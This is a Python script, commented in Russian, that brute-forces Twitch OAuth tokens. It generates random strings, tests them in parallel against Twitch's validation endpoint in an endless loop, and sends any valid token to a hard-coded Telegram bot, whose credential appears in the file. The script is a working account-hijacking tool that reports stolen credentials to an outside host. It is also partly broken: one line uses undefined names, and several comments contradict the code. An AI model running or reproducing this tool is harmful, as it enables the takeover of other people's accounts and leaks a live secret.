import random
import string
import requests
from concurrent.futures import ThreadPoolExecutor, as_completed
from telegram import Bot
import time

# Конфигурация
TELEGRAM_TOKEN = '7343454082:AAEwgrgB8HerkLFpcU2odZK5d9hShKKvIiQ'
CHAT_ID = '6578018656'

bot.send_message(chat_id=chat_id, text= "бот работает")


def generate_token(length=32):
    """Генерирует случайный токен из букв и цифр"""
    characters = string.ascii_lowercase + string.digits
    return ''.join(random.choice(characters) for _ in range(length))

def check_twitch_token(token):
    """Проверяет, действителен ли токен через запрос к Twitch API"""
    url = 'https://id.twitch.tv/oauth2/validate'
    headers = {
        'Authorization': f'OAuth {token}'
    }
    
    try:
        response = requests.get(url, headers=headers)
        return token, response.status_code == 200
    except requests.RequestException as e:
        print(f"Error checking token {token}: {e}")
        return token, False

def send_telegram_message(bot, chat_id, message):
    """Отправляет сообщение в Telegram"""
    bot.send_message(chat_id=chat_id, text=message)

def main():
    bot = Bot(token=TELEGRAM_TOKEN)
    
    while True:
        # Генерируем токены
        tokens = [generate_token() for _ in range(50)]  # Генерируем 10 токенов
        print("Generated tokens:")
        for token in tokens:
            print(token)
        
        # Проверяем токены
        print("\nChecking tokens:")
        with ThreadPoolExecutor(max_workers=50) as executor:
            future_to_token = {executor.submit(check_twitch_token, token): token for token in tokens}
            for future in as_completed(future_to_token):
                token, is_valid = future.result()
                if is_valid:
                    message = f"Token {token} is valid."
                    print(message)
                    send_telegram_message(bot, CHAT_ID, message)
                else:
                    print(f"Token {token} is invalid.")
        
        # Пауза перед следующей итерацией
        time.sleep(10)  # Задержка 60 секунд (можете настроить по своему усмотрению)

if __name__ == '__main__':
    main()
